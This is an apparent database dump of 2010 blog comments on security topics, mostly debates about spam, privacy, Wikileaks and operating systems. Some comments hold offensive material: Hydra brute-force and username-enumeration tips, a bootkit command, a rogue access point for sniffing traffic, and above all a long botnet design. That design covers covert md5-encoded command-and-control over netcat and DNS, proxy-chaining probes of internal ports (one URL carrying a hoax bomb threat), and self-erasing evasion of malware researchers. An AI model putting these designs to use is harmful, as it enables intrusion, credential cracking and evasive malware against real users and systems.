I\'ve been using Firefox from back in the Phoenix days and switched to it because it was lightweight, ran on pretty much everything, quick, small size, and small memory footprint. The big reason though was because of it\'s small footprint. Compared to Netscape at the time which included just about a small OS\' worth of programs, Phoenix was just a browser. And it worked well.\r\n\r\nThen Mozilla took it over and more features continually get added making it slower and more resource intensive.\r\n\r\nI\'d like to switch to Chrome full time and see a lot of people are but it relies on the system\'s proxy setting and can\'t be set to a different proxy server (like ZED!), without changing it for the entire system.

You code put a bootkit on the system which auto-executes \"rm /var/db/.applesetupdone\" which just removes a file that states that OSX install is Complete and possible just automate the setup process.

I\'ll elaborate a bit.\n\n1) The email address that was used was his.  Generally when someone has malware, the malware will use his SMTP server, so I would have seen his IP, but the address used will be something random - ie someguy1234@yahoo.com, or whatever\n\n2) There\'s a certain \"feel\" to malware spam.  Misspellings, links to tinyurl.com to mask true url\'s, odd quirks in headers, etc.  Plus, the content, depending on the botnet used, will usually be about drugs, products, male enhancement, etc.  None of these were the case in this email\n\n3) The email that I received was spamming about his barter network - this wasn\'t included in the post because I didn\'t think it was really relevant.  So, the idea of being infected by malware that is sending out emails on his behalf, without him knowing, but spamming for his company is.. well, unlikely..  :-)\n\nI understand where you\'re coming from, though.  Had I had any doubts that the spam that I received wasn\'t specifically coming from him, I wouldn\'t have posted this.  Having the ability to obtain all of this information is kind of like using a gun.. you want to make damn sure of your target before you pull the trigger.\n\nA good example of malware spam is one that I received yesterday.  My email address was harvested in the same way that Steve harvested mine (via craigslist).. and it was coming from the guys AOL email account.. but the \'originating-ip:\' header was an IP address in Italy.  When I began to research the email address, nothing had any ties to Italy and the dude lived in like, Indiana.. so I sent him an email letting him know that his account had been hacked and provided him with the headers/IP address of the person using his account.\n\nThanks again for your comment.

I think one of the bigger culprits here is Facebook\'s open profiles. I don\'t think that should be an option, and I don\'t quite get their intensions of this yet. The people I am most worried about this with is young, single girls. Posting provocative profile images (Which many of them do without thinking - it\'s part of culture, ya know?), posting their feelings, even things like their relationship status has guys all over that. I hope there is a privacy revolution one of these days - like people just having a better sense of how much they put online and what it could turn into.\n\nThanks for the post =)','2010-10-29 18:13:00','2010-10-29 23:13:00','0','0','173','','0'),(

I\'ll be using this post as evidence to family and friends that it isn\'t paranoia that makes me cautious, it\'s education.  I\'ve wanted to write a post like this for years, and didn\'t have to guts or the determination.  A heartfelt thank you.\n\nAs a follow-up to your article...  I determined that Steve (Ralph) and Nancy, are just trying to make their way in the world.  They weren\'t that good with money, but in general nice people, and he has dreams of making a few bucks while in retirement.  He doesn\'t understand this stuff, and he probably saw some questionable software or \"business\" service or whatever, that reads:\n\"These emails addresses were collected FREE from the internet.  These people posted their e-mail addresses so you could contact them.  Email them and see if there\'s a fit for your business\".\nI have consulted small businesses for 13 years now, and have seen more than one of the my clients either buy that stuff or ask me my opinion about it.  They are naive and innocent.  Or at least my clients were.  Poor Steve and Nancy.  I prefer to think the best of them.\n\nI don\'t mind you used Steve as an example though.  Real examples drive the point home.  I\'m just hoping that someone let him know about this post so he can start working on reducing his vulnerability, and will stop using that software/whatever he\'s doing.\n\nAgain, thank you for the article.\n\n-Pete','2010-11-03 17:24:24','2010-11-03 22:24:24','0','0','173','','0'),(

The fact of the matter is, I\'ve run businesses and have felt the allure of spam, but have chosen not to use that method to advertise for the simple fact that I don\'t want to contribute to the overwhelming problem that we have on the internet right now.\n\nSo, if you choose to put ethics and morals aside and let greed get the best of you, you shouldn\'t be too surprised when you face some consequences.  Thankfully, for Ralph (and Nancy), I\'m not a complete dink and left out some critical information that would have allowed people to completely steal his identity and/or ruin their lives.  Did I want to?  Yeah.. but I had to stick to my own ethics.  If I screwed up on the internet and did something like this, sure.. I\'d be pissed, but I\'d face up to what I did and just be thankful that the person who wrote the article didn\'t give away everything.\n\nNow, that being said.. if I can get the info, so can everyone else.. I didn\'t really use anything fancy to get this info, so it\'s out there for the taking.  Ralph represents a huge number of individuals who could easily fall victim to this same attack.\n\nAnd.. I\'m certain someone informed him.. his Facebook account got real tight after this post, though his wifes didn\'t.  lol.  Also, when googling for his website, my website shows up before his.. so I he\'s probably found the article himself.. :-)\n\n- matt','2010-11-04 09:34:00','2010-11-04 14:34:00','0','98','173','','2');

So, lets say that you have 5 wireless networks that you connect to regularly. Your computer is constantly searching for one of those available networks and Airbase will be listening and it will pretend to be one of those networks that your computer is searching for, allowing you to connect to it. Once you’re connected, you can browse, just as if you were connected to your regular network. However, this time, you’re connecting through my computer. Everything you do on the internet is visible to me.\"\n\nLet\'s say that my client is configured to use a network with WPA encryption, will it still connect to this fake AP? I would think (hope) that  it will never associate with an access point that has no encryption or uses a different encryption key, so fake AP should not be able to fool it. Am I missing something?\n\nThanks.','2012-03-27 11:55:40','2012-03-27 16:55:40','0','0','219','','0'),(

I usually use Tor when I\'m following a link from an email (or that someone posts here) to hide myself.. and the same goes for when I\'m using google-fu, sql injections, or digging through a company\'s website.  If I want to do a portscan, I\'ll usually use Tor and go to one of the many websites that provide portscanning tools.\n\nThe biggest problem with trying to hide a portscan is that it really limits the functionality of your scan, which makes it difficult to determine firewall rules and whatnot.  If I\'m doing an actual penetration test, however, I\'m not worried about getting caught so much, so I don\'t hinder myself by trying to be anonymous unless the client is specifically interested in seeing how well their detection mechanisms work, then I go the extra mile to try to hide myself and not trip NIDS.','2010-06-16 11:50:19','2010-06-16 16:50:19','0','263','329','','2'),(

None of us really know what the other documents contain, but I doubt that Assange has any real interest in leaking information about military coordinates and soldier names, addresses, etc.  Wikileaks is primarily interested in releasing information that would be considered a cover-up, inside information, or something embarrassing to governments.  I would actually lose a lot of respect for Wikileaks if Assange were to release information that did put peoples lives in danger, but I really don\'t think that\'s the goal of Wikileaks.\n\nIt will be interesting to see what other documents are released and published.\n\nI appreciate your input and you\'re right, my argument is definitely one sided and biased.  It\'s mostly based on my personal experience with Lamo and everything I\'ve seen about him beyond what I knew personally.','2010-06-17 17:43:56','2010-06-17 22:43:56','0','271','355','','2'),(

I can\'t believe how easy the \'hacker community\' is letting Adrian Lamo off with... I mean, is there a bigger evil-doer than the military-industrial complex of the United States to any right-minded hacker? The military is the enemy of information, they are the cointel in cointelpro, they are the ones who would take over this country if they didn\'t already run it. Almost all of your tax dollars goes to them so they can use it to bully resources into the hands of the corporations that don\'t HAVE to pay taxes because you do it for them. Remember that endless cycle?\n\nBut let\'s forget all that for a second. In Latin America, during the 20th-century military dictatorships there (the ones that just started collapsing in the mid-80s, meaning it was people in their 40s - 50s now who resisted the dictatorships in underground cells), people were outcast for ANY kind of informing. And this was during a time when fingers were being broken, electroshock torture was being used, women were being raped and impregnated by their torturers, Operation Condor, Dirty War era. Look it up if you\'ve never heard of it. And even with all that going on, people STILL were not given any leeway if they talked. You were expected to take it. Those were people who BELIEVED in something. \n\nFast forward to today. Our stupid, lazy, ironic, apathetic generation... the governments are still imprisoning innocent people, still torturing them, the CIA is still trying overthrow democratic governments that don\'t agree with them 100% and yet here comes Adrian Lamo, a snitch just to be a snitch, just to get his name to have a higher Google PageRank. And where are people to take a stand against something this low + rotten? \n\nI couldn\'t BELIEVE that Lamo went to HOPE and there were actually people defending him. What is WRONG with everybody? Meanwhile, a decent, pure-hearted 23-year-old is sitting alone in a cell in a military detention facility in Kuwait, not even aware of what\'s going on out here, probably scared to death and he\'s facing over 50 YEARS IN PRISON. He\'s 23 now -- and he\'ll be 74 YEARS OLD when/if he gets out. Because of Adrian Lamo.\n\nYeah, the kid made a mistake in trusting Lamo. But making a mistake and intentionally screwing someone over for 10 minutes of fame is a BIIIIG difference.

Who is at danger because of that? The only DANGER might be that people might realize what is going on in these ways, wise up, and actually start to care enough to DO something about it.\n\nWell, you get my point. People who are willing to give Lamo a break on this really need to get themselves correct. It\'s hard to think of something you could do lower than what he did. And he deserves to hear it, non-stop, every single day that Bradley Manning is in a jail cell.\n\nMeanwhile, you can contribute labor, money, or whatever you got to his international support group at http://www.bradleymanning.org/','2010-07-21 04:26:16','2010-07-21 09:26:16','0','0','355','','0'),(

Lowercase (-l or -p) is set username/password uppercase (-L or -P) is password list. (In the above case you\'ve used uppercase P but not provided a list, instead you\'ve provided a set password (unless you have a file names passwod in your current folder?)\n\nReplace the word \"Incorrect\" with whatever unique string is returned on failure. \"Invalid password\" whatever.\nIf the site is insecure enough to provide a different string for incorrect usernames than it does for incorrect passwords, then it\'s a good idea to use a set unlikely password and a list of usernames to enumerate a list of valid usernames first. You can then use this list of valid usernames to save yourself alot of time.\n\nI have noticed there are a couple of flaws in Hydras form cracking methods though.\n1: If the form uses POST for the usernames and passwords but uses GET for other information simultaniously you will have to do a little work to see which the form will accept as hydra wont allow you to mix. For example a site i came across recently used POST for users and passwords but GET for an extra variable \"Confirm=1\" using POST on hydra wouldn\'t work because the site wouldnt take confirm=1 POSTed. However using hydra\'s GET attack did work because the site would take the usernames and passwords as GET. If that makes any sense?\n2: The very same site would allow me up to 1200 attempts a min. However because hydra only allows you to pass it a string to search for on an unsuccessful attempt, And if that string isn\'t found it assumes valid. Whilst going at speed it will often only half download pages (stopping before the the invalid string in the page). This returned false positives. As hydra doesn\'t allow you to tell it to continue with the same username even after it\'s found the password. This resulted in it getting a false positive and moving on to the next username. If this option was available false positives wouldn\'t matter so much because it would still go on to test the rest of the password list against that username. After hydra has finished you could then go on to test all the false positives again which would take no time. Instead hydra skips that username believing it\'s found the password already. Without changing the code theres no way to prevent this. Also as mentioned before hydra will only allow you to set a string for incorrect attempts, if it isn\'t found it\'s assumed valid. I happened to have a valid U/P for this site. Therefore I had access to a string that would only be returned if the attempt was valid. If hydra would allow a double check \"Invalid\" if it\'s invalid and \"Welcome\" if it\'s valid this wouldalso prevent false positives. If could recheck a password each time BOTH requirements arn\'t fulfilled. (In the case that \"Invalid doesn\'t appear, and neither does \"Welcome\") If either of these options were added (a valid string parameter and a continue with same username after successful login option) These somewhat major problems could be avoided.\n\nThese problems serve to make hydra a thousand times less automated. Each time there\'s a false positive I have to stop hydra open the password list, remove the passwords up to the false positive and save the password file as new with the username it stopped on appended to the name. Then start the search with that username again with the altered password file.

For example, the admins of the affected social networks could alter the list of dorks to something harmless, remove the dork list, or target an opponent\'s website by appending site:target.com to each line...\n\n\n\nI think it\'s feasible for bots to update themselves in the wild without c&amp;c.

RFI, LFI, RCE, XSS, CSRF, SQLi, DoS and some information disclosure vulnerabilities.\n\nIt would be hard for a bot to know how to automate exploitation using LFI, XSS, CSRF and information disclosure but SQLi, RFI and RCE could all be automated to own a box.\n\nFurthermore, it could make use of web application fingerprinting techniques to identify a web app exists before attempting exploitation to decrease detection.\n\nIf self-updating bots proves viable perhaps in the future we\'ll see a neural network powered worm learning which exploits are the best to gain access to systems and learning to read advisories. . .\n\nYeah right - who has time to write <strike>skynet</strike> a neural network when phishing still works?','2010-10-10 10:06:06','2010-10-10 15:06:06','0','0','386','','0');

That way, you look like a victim, not the perpretrator, and can hide commands in botnet maintenance communication (keepalive, host notification, whatnot). To speed up the process, you could have this hidden command crawl to a random node and then that node launches the command \"properly\" from there. You could even use this to \"patsy\" other people by making a zombie look like the controlling machine.\n\nTo improve performance and connectivity, I\'d have a FastTrack-style ring hierarchy -- Ring 1 would be machines largely unfirewalled and with fast connections that issue commands to Ring 2, the unwashed masses. (There is no Ring 0 -- you are somewhere in Ring 1 or Ring 2, indiscernable from the rest of the botnet.)\n\nAs for communication, my first thought is some kind of encrypted VPN-style network with a full-blown key setup and certificates/keys for each node.

If your worm spreads slowly it\'s game over when you\'re asked why you\'re at the center of a worm infection. Maybe leave your wireless open?\n\nIf \"I dunno, I got hacked\" worked for plausible denial then I\'m sure it would be used in court more often. \"What\'s an internet?\" When you get busted try out \"I was writing a random number generator and it became sentient.\" I\'ve always wanted to see how that would play out in court.\n\n\"I was working on it and released it by accident\" fails, as per the ILOVEYOU author. Not like he had much of a choice after leaving his name in the worm\'s comment header. He did land a security job out of it though.\n\nI like roothorick\'s rings idea, although I would go so far as to add a primary XSS layer (Ring 0) which initiates driveby exploits against the browser (using either JS or ActiveX) and attempts to exploit embedded devices within the victim\'s intranet (by ip and port scanning with JS). Ring 1 and Ring 2 could spread (in addition to the usual ways - network shares, email, removable media, etc) via the internet using SQL injection, persistent XSS and abusing open redirects to plant the Ring 0 droppers.\n\nI also like roothorick\'s idea of SSL/443. Good old IRC supports SSL obviously.\n\nPersonally I\'d prefer to backdoor the system, sniff network traffic and act on specific commands (encoded as md5 strings) to any port TCP / UDP. You run the risk of having the botnet hijacked should someone reverse engineer the triggers, however rotating the hash salt would buy some extra time. Also, you face the same issue with SSL if the researcher MITMs and runs ssl-strip.\n\nIn addition to matt\'s node idea :\n\nWe miss out of SSL encryption unfortunately, but we can still use md5, sha1 or anything for that matter.\n\nAssume we want to send a command to our bot on target.com to attempt to inject SQL on 192.0.32.*\n\nThe command \"SQLI\" : 0a3b1a03c6bf4091c13b1579ed0bdd32\n192 : 58a2fc6ed39fd083f55d4182bf88826d\n0 : cfcd208495d565ef66e7dff9f98764da\n32 : 6364d3f0f495b6ab9dcf8d3b5c6e0b01\n* : 3389dae361af79b04c9c8e7057f60cc6\nEOF : 4423718c61c4e8a4362d955bbc7b9711\n\nPutting it all together. HXXP is used but DNS or any other plain text protocol is fine. We could probably even use HXXP over unencrypted HXXPS port 443. At least it would probably appear like benign encoded traffic to a novice network administrator :\n\nnc target.com 80\nGET /0a3b1a03c6bf4091c13b1579ed0bdd3258a2fc6ed39fd083f55d4182bf88826dcfcd208495d565ef66e7dff9f98764da6364d3f0f495b6ab9dcf8d3b5c6e0b013389dae361af79b04c9c8e7057f60cc64423718c61c4e8a4362d955bbc7b9711 HXXP/1.0\nHost:target.com\n\n\nThe bot on target.com notices a hex pattern in a multiple of 32 bytes and larger than 192 bytes (1 operator, four IP integers and 1 EOF = 6 x 32 character hashes = 192), fly over the wire. It splits by 32 bytes and brute forces the operator and IP address and constructs the command. Obviously we would salt the hashes, even though the salt would be easy to reverse engineer. It then performs the required task, in this case attempting SQLI against the entire 192.0.32.* netblock.\n\nIt would be possible to build the bot as a framework and receive files (aka \"modules\") over DNS when required, md5 encrypted, and then brute force the output on the other side. Some guidelines would need to be established, like splitting all strings in to 4 byte segments before md5 hashing to speed up brute force, command delimiters, etc. This would be horribly slow, considering today\'s internet speeds, but could would be pretty stealthy and could be split up over a period of days or even weeks for the ultra-paranoid, so long as some sort of CRC/resume function was implemented, in a similar way to how TCP/IP handles packets which arrive out of order.\n\nFor example, let\'s say a bot on 192.168.1.1 needs a gdi-exploit module to escalate privileges. It contacts it\'s parent, 192.168.1.2 and asks for the exploit :\n\nSelf : 192.168.1.1 : 66efff4c945d3c3b87fc271b47d456db\nCommand : GMOD (for \"get module\") : 7f954fa75dded240ae293957dbebd324\nFile : escalate/gdi-exploit.exe :\nFile[0] : esca : ccb1b72dd71e3cf1b722058660cf1c38\nFile[1] : late : f2c67381db28fa11c59fe7a6df0f2587\nFile[2] : \"/\" Category/Filename Delemiter : 6666cd76f96956469e7be39d750cc7d9\nFile[3] : gdi- : 5de7a70b9350d7a9b973f083e74ed2e7\nFile[4] : expl : dc653fc0484527ae99855fdd042b2747\nFile[5] : oit. : be3930bc371559a37c9092ecacad9912\nFile[6] : exe : 98e83379d45538379c2ac4e47c3be81d\nFile[7] : EOF : 4423718c61c4e8a4362d955bbc7b9711\n\nNote I\'ve introduced \"self\". This is a rudimentary check - if the md5hash of the remote IP+salt does not match the first 32 bytes of the request it will abort the request. This could be due to incompatible salts or an incorrect IP. This is meant to catch unwary researchers but will fail pretty horribly when presented with domain names and domains with different IPs. This is merely an example.\n\nPutting it all together :\n\nnslookup x66efff4c945d3c3b87fc271b47d456db7f954fa75dded240ae293957dbebd324ccb1b72dd71e3cf1b722058660cf1c38f2c67381db28fa11c59fe7a6df0f25876666cd76f96956469e7be39d750cc7d95de7a70b9350d7a9b973f083e74ed2e7dc653fc0484527ae99855fdd042b2747be3930bc371559a37c9092ecacad991298e83379d45538379c2ac4e47c3be81d4423718c61c4e8a4362d955bbc7b9711 192.168.1.2\n\n(This may be too long for a domain name, I haven\'t checked)\n\nNote the \"x\" before the request, this is so the recipient bot knows where to begin splitting by 32 bytes, seeing as x will never appear in hex.\n\nThe parent responds back to the same port, having been eavesdropping on port 53 :\n\nSelf : 192.168.1.2 : 8a120ff3e2c86713f4d346d20f763ee7\nCommand : WMOD (for \"write module\") : cc267bf711c2fbacab7c92d8b69d9e2e\nTotal Size : (always in bytes) : 3000 : e93028bdc1aacdfb3687181f2031765d\nFile[0] : binarydata : fa13e55202c138908566cbecca4bd5de\nFile[1] : binarydata : fa13e55202c138908566cbecca4bd5de\nFile[2] : binarydata : fa13e55202c138908566cbecca4bd5de\nFile[3] : EOF : 4423718c61c4e8a4362d955bbc7b9711\n\nnc 192.168.1.1 $CHILD_PORT\nGET /x8a120ff3e2c86713f4d346d20f763ee7cc267bf711c2fbacab7c92d8b69d9e2ee93028bdc1aacdfb3687181f2031765dfa13e55202c138908566cbecca4bd5defa13e55202c138908566cbecca4bd5defa13e55202c138908566cbecca4bd5de4423718c61c4e8a4362d955bbc7b9711 HXXP/1.0\n\n\n\nPretty rudimentary . . . But it immediately seems useful, because you can use unwitting users browsing the internet to send commands to your bots using simple HXXP GET requests via image  tags.\n\nFor example,\n\n\n\nFurthermore, we can abuse open and blind proxies to attack other targets or pivot inside an intranet and send code to our bots behind the firewall. There are numerous instances of blind proxies allowing access to internal domains and non-HXXP ports, in fact I\'m writing a paper on it at the moment. Consider an open or blind proxy that does check ports or validate domain names :\n\nhxxp://target.com/?url=hxxp://localhost/\nhxxp://target.com/?url=hxxp://localhost:21/\nhxxp://target.com/?url=hxxp://localhost:22/\nhxxp://target.com/?url=hxxp://localhost:25/\nhxxp://target.com/?url=hxxp://fbi.gov:80/?THERES_A_BOMB_IN_THE_BUILDING_LOLOLOLOL\n\nYou can also chain these together to hide the origin of the command/attack, just make sure you pick open/blind proxies which don\'t leak the referrer. Also, the first host in the chain will be able to see the entire chain, and the second host will be able to see all but the first host, and the third host will be able to see all but the first and second hosts, etc. An attacker would abuse this knowledge by starting the proxy chain in a country that is neutral or known to have slack security.\n\nThoughts?\n\n---\n\nAgain, I\'m hijacking the conversation from C&amp;C to autonomous behavior without C&amp;C, but with good reason. One of the biggest issues for botnet owners, perhaps even bigger than finding commands as matt suggests, is the discovery of their creation by researchers. The fundamental flaw in using social networks for C&amp;C, as matt suggested, is that they\'re too easy to discover, monitor and block.\n\nCurrent mitigation tactics for botmasters include DDoSing every host from the bot to the researcher, inclusive, and using fake administration panels to distract/lure/monitor researchers (aka `bot hoenypot`, see: hxxp://www.boingboing.net/2010/11/05/botmasters-include-f.html )\n\nI\'m still waiting to see a properly paranoid bot. Surely a botmaster would prefer to lose a few bots than risk discovery? The longer it takes researches to reverse engineer, the more time available to propagate. Where\'s the bot that stops all aggressive behavior the second it spots a sniffer in memory or an access attempt at its admin panel or a portscan from localhost, or an incorrect key used with a remote bot command, etc, etc? Blocking security tools from running (such as regedt32 and hijackthis.exe) just screams infection, even if it is annoying to have to rename your files.\n\nLet\'s say I\'m a bot and I\'ve detected I\'m under attack --- from localhost! I can\'t remove myself from memory or else the local rootkit files and processes will become visible. I know someone is already on to me but chances are they won\'t find where I came from unless they\'ve been watching me since infection. I can\'t blacklist the IP because this could be too easily exploited by researchers (also, the IP is localhost in this case). We can\'t just uninstall, for the same reason. Furthermore we can\'t call home for fear of giving away our parents locations.\n\nFight, flight or ahem; propagate.\n\nFight? --- They\'ve cut off internet access and I can\'t call in DDoS support. Not that I\'d want to because giving away the locations of other bots by calling them in to an obviously malicious environment is pretty stupid. Yeah I said it. Come get me Conficker botmasters.\n\nPropagate - Ideally I would go silent for 12-72 hours then revert to some sort of autonomous behavior whereby I don\'t take commands for fear of infection, but continue to spread to achieve pre-programmed goals (ie, privilege escalation, network privilege escalation or webserver infection for ring 0), prioritizing based on my location and privileges on the local network. The idea from here on out is that i\'ve been compromised. I\'ll continue to infect hosts and point the dropper at myself as their parent, but i will no longer take commands. This would be fine against a curious home user but wouldn\'t stand up against a researcher in a test lab.\n\nTheoretically I could occasionally send SOS messages to random IPs in the vein hope they\'re friendly. This way it would be possible to blacklist the address and stop other copies of the worm from contacting the compromised network in distress. Again this just begs to be abused by researchers.\n\nAgainst researchers I take a highly emo alternative where, short of uninstalling myself, flight is appealing. Detecting the existence of a VM with no network access is crucial and is probably the only time I\'d consider such a drastic option :\n\nShut down all outbound bot connections. Stop any background process, such as writing to removable media or attempted network password cracking. Write dropper to start-up, write shredder binary to temp, shred all bot files which aren\'t being used to hide the process, close bot processes/threads and shred the remaining bot\'s file(s). This leaves the researcher with practically nothing on me. They have a generic shredder file, a dropper of which they were probably already aware (why else is a researcher watching me?) and whatever they managed to sniff from the wire or dump from memory.\n\nGranted there\'s no real way to stop a researcher running the worm in a VM, unless you can break out. You can only make their job more difficult.\n\n1770 words!? I swear you need to put a word limit on comments or I\'d keep typing.','2010-11-15 13:45:43','2010-11-15 18:45:43','0','0','386','','0'),(

We\'re aware of your script and stuff and could also start blocking tor, if we want. But we want to offer a free service, which enables easy and stable sharing of pictures. This also means (at least for us) that we want ppl to access \"anonymously\" the pictures, so blocking tor would kill this intention.\nPicPaste was build as a easy to use service, to allow ppl to upload a picture and tell other ppl the url, like on phone. For that reason we choose a simple code to avoid some \"long stupid\" urls. This was at least good for about 5 years now.\nToday we pushed a new feature which enables ppl to add a random string or complete obscure the picture name, to avoid simple guessing like you used.\nWe\'ll keep up this service as long as ppl are happy and using it, but we\'ll not put manpower on fix every \"boring script work\"-load out there.\n\nSo, at least for us, we have finished our work \"against\" such attacks. Those attacks are attacks on our users, not our service directly, as you try to get their pictures without permission. This was the reason for us to block your script, and will block such attemps in future.\n\nHopefully you understand that we\'re not interested in a \"code war\". So it would be nice if you just leave it \"as is\" and enjoy the stuff you already grabbed.\n\nRegards,\nThe PicPaste Service ;)','2010-08-17 14:43:01','2010-08-17 19:43:01','0','0','487','','0'),(

And, the underlying point of this post was not necessarily to cause you problems, but to point out the overall problems that we come across on the internet when people (designers/programmers) focus more on the end result without putting much attention in to the ways services can be abused, hacked, or manipulated.\n\nSo, at your request, I\'ll discontinue updating the script any further because I feel the point of my post has been relayed pretty clearly...\n\nMy only question to you, though, is.. why not make the random string a default option?  Considering that most people simply copy &amp; paste the url in to an email, IM, whatever.. a few character random string shouldn\'t really cause too much trouble.  Then allow people to turn the feature off if they care to.\n\nAnyway, thank you for a civil response to my post/script and I hope that it didn\'t cause you too much of a headache.  ;-)','2010-08-17 14:54:22','2010-08-17 19:54:22','0','462','487','','2'),(

But it seems that the feature is beeing accepted by the users and we also regognize the setting, so an user just has to set it once and will be automaticly get the same setting in future.\nIf no problems will be reported so far, we\'ll make the \"easy\" setting the default in the next days.\n\nRegards,\nPicPaste :)','2010-08-17 15:00:26','2010-08-17 20:00:26','0','0','487','','0'),(

Personally, if I ran one of your routers/switches/whatever and found out that I had lost trade secrets or valuable information due to a hole that your company intentionally put in to my router/switch, you would have a lawsuit on your hands.\n\nIt is not your responsibility to provide a way for your customers to log in to their device if they\'ve forgotten their password.  If they\'ve made the mistake of setting a password and not documenting it, remembering it, something, that is not your company\'s issue - it\'s theirs.  And, if they have to reset their router/switch as a result of their carelessness, maybe the task of reconfiguring the router will make them be a little more diligent the next time.\n\nAll of us have forgotten our passwords to something at some point in our lives.

Integration, consistency, etc. all make it a difficult task to manage.\n\nHowever.  In the \"<a href=\"http://en.wikipedia.org/wiki/Mythical_man_month\" rel=\"noindex\" target=\"_blank\" rel=\"nofollow\">Mythical Man Month</a>\", Brooks talks about the idea of adding more and more people to projects and the problems that it causes, which is what Microsoft suffers from.  Not only that, but a software giant such as Microsoft, which is worth billions and billions of dollars has the resources available to produce solid code.\n\nYes, Linux has its vulnerabilities, too.  But, there are a few key differences:\n\n1) When a vulnerability is discovered, a patch is issued within hours, not days, not weeks, not years.  There was recently a vulnerability found in \'sudo\'.  Just about as soon as I was done reading the advisory, my autoupdate agent popped up indicating that it wanted to update sudo.  Why can\'t Microsoft seem to accomplish this feat?  Why do I have to wait for a week, or more, for an 0day fix?\n\n2) Vulnerabilities are often found by developers of Linux, not by hackers.  Because source code is openly available to all aspects of Linux, Joe Schmoe programmer can go through the code and if he notices something out of the ordinary, he can report it.  Unlike Microsoft where kids can sit and fuzz the crap out of a program until they discover something.  Developers generally don\'t sit around fuzzing.\n\nI think you\'re wrong to say that Microsoft is targeted due to its market share.  If that were the case, every hacker and their dog would be targeting LAMP, considering that Microsoft cannot touch it when it comes to internet services.  Apache, last I saw, is run on approximately 34% of internet servers, IIS is around 12%.\n\nYes, I will agree that Microsoft brought the computer to the home, which I do appreciate.  My life didn\'t start on Linux, it was DOS, then 3.1, then a mix of Linux and 95.  I never ran Windows 98 or up.  I\'ve also never had a virus, or spyware, nor have I had my identity stolen.  Out of everyone that I know, I\'m the only one who can say this.  Ironically, I\'m also the only one that I know that runs solely Linux.  Hell, even the Windows fanboy Krebs suggests using Linux to do stuff on the internet (<a href=\"http://voices.washingtonpost.com/securityfix/2009/10/avoid_windows_malware_bank_on.html\" rel=\"noindex\" target=\"_blank\" rel=\"nofollow\">http://voices.washingtonpost.com/securityfix/2009/10/avoid_windows_malware_bank_on.html</a>).\n\nTo be honest, and security completely aside, the fundamental design of Windows is flawed, for the end user, anyway.  One of the biggest issues that I see with Windows is the registry.  Everyone knows that a week after you buy a computer, it wont be as fast as it was when you first bought it.  Why?  The registry.  It is a constantly growing beast that continually takes longer to load the more you use your computer until eventually your computer is so slow that you either have to start from scratch, or buy a new one.  This has worked out remarkably well for Microsoft, but not so well for the consumer.  Microsoft has left it up to the applications to clean up the registry after themselves, but there are soo many terribly written programs out there that this never seems to happen.  If I remove a program, I want it gone.  Period.  I don\'t want 8000 hives saving information in the registry \"in case I decide to reinstall\".\n\nI guess, ultimately, I just expect more out of a company that charges absurd amounts of money for its software, when the end product is slow, bulky, buggy, and will likely get you owned.','2010-09-09 10:05:22','2010-09-09 15:05:22','0','525','573','','2'),(

It is used on about 89% of desktops according to this Wikipedia article:\n\nhttp://en.wikipedia.org/wiki/Usage_share_of_operating_systems\n\nThe stupid desktop user is the weakest link - not the server admins. If stupid users were using more of another operating system, say Apple, I really believe the malware writers would focus their attention on those other systems.\n\n\nI am a software developer for a Windows product, and I fuzz it a lot :) I will agree that developers do not usually sit around fuzzing - but I think that is also true of OS X and Linux developers as well.\n\n\nI also agree the registry sucks, but I can see how in a development meeting 15 years ago, it seemed like a good idea at the time. Same with their stupid COM interface.\n\n\n\"I guess, ultimately, I just expect more out of a company that charges absurd amounts of money for its software, when the end product is slow, bulky, buggy, and will likely get you owned.\"\n\nThat is a fair point that can only be made by the person who has the money in their pocket. Unfortunately, 89% of the desktop users have also evaluated this decision and went with Windows. \n\nI also continue to make the same decision as you have - and even have converted my wife :) Hooray for Ubuntu!','2010-09-10 17:52:32','2010-09-10 22:52:32','0','0','573','','0');

Newspapers from the day ridicule the automobile as a poorly designed tool which was of such low quality it would fade from existance in a short period. \n\nElectric cars were also made around the same time, enjoying much greater success than fueled versions. They were quiet, fast and produced no fumes. Why then do we have fueled cars now?\n\n1914, enter Henry Ford. He started the production line with the Ford Model T. Purely by affordability he managed to spread the fueled car through America, Europe and even the edges of Asia.

'560','','1','Matt','75.72.21.51','matt@attackvector.org','http://www.attackvector.org','@Pegoto:  Well, there\'s quite a few of them.  Bayesian filtering works on this theory.\n\nA few that I specifically look for are:\n\n1) Country of origin.. Most spam originates from Korea, Russia, China, etc.  These would be characteristics... so, I have a filter that bans all emails except for emails from countries that I specifically allow.  Similar to when configuring your firewall - default policy should be \"deny all\"\n\n2) On that same note, one issue is emails that are sent through Yahoo.  Yahoo is a US company, so relying specifically on the domain \"yahoo.com\" wont work.  However, Yahoo includes a header called \"Originating-IP\".  This is the real IP address of the sender, so I wrote a filter that checks that against my country database.  If that\'s not on the list of \"allowed countries\", straight to the spam filter it goes.\n\n3) Rarely do spammers use legitimate email servers, so when a user sends us an email, we return a 450 message.  A mailserver that follows RFC 821 will queue the mail and attempt delivery again.  We take the sending email address and match it to the one that should already exist in the database when the mail server attempts redelivery.  If it exists, we allow the email to go through and the sender is considered \"legitimate\" for 30 days.  But, most spam emails will never attempt to resend when they get the 450 because they don\'t know how to handle it properly.  This system is called \"greylisting\"\n\nThe route an email takes through our filtering system goes something like this:\n\nEmail ---->  RBL (DynIP/Zombie/etc) checks ----> Greylisting ----> Bayes ----> Custom filters via Mimedefang ----> Virus scanning ----> Delivery\n\nEssentially, it goes from the least CPU intensive to the most.  \n\nThe success rate of this system has been rather surprising, to be honest.  We receive about 1500-2000 emails a day.  Of those, about 2% are legitimate.  I\'ll see, maybe, one false positive a month, and maybe one spam that makes it through a month to one of our users.\n\nI hope this gives you some ideas.. I\'ve spent a lot (a LOT) of time working on effectively blocking spam and through my testing/experience/etc. I\'ve come up with a solution that has been incredibly effective and I think a lot of other companies could benefit from it.. because, honestly, I have no idea how a company could operate without the ability to effectively filter spam.','2010-09-11 00:28:17','2010-09-11 05:28:17','0','559','587','','2');

